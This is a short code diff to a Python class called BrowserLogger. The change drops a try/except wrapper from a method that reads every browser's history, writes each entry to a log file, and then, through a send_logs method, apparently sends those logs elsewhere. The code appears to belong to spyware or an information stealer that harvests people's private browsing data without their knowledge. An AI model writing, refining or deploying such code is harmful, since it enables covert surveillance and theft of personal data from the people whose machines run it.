@@ -17,18 +17,15 @@ class BrowserLogger:
 
     def log_browser(self):
         browser_histroy = browserhistory.get_browserhistory()
-        try:
-            if browser_histroy:
-                for browser, history in browser_histroy.items():
-                    for search in history:
-                        log_to_file(
-                            self.log_file, f"{search[2]}: {search[1]} ({search[0]})"
-                        )
-                    log_info(
-                        f"Logged browser history: {search[2]}: {search[1]} ({search[0]})"
+        if browser_histroy:
+            for browser, history in browser_histroy.items():
+                for search in history:
+                    log_to_file(
+                        self.log_file, f"{search[2]}: {search[1]} ({search[0]})"
                     )
-        except:
-            pass
+                log_info(
+                    f"Logged browser history: {search[2]}: {search[1]} ({search[0]})"
+                )
 
     def send_logs(self):
         send_log_file("`Sending browser logs...`", self.log_file)
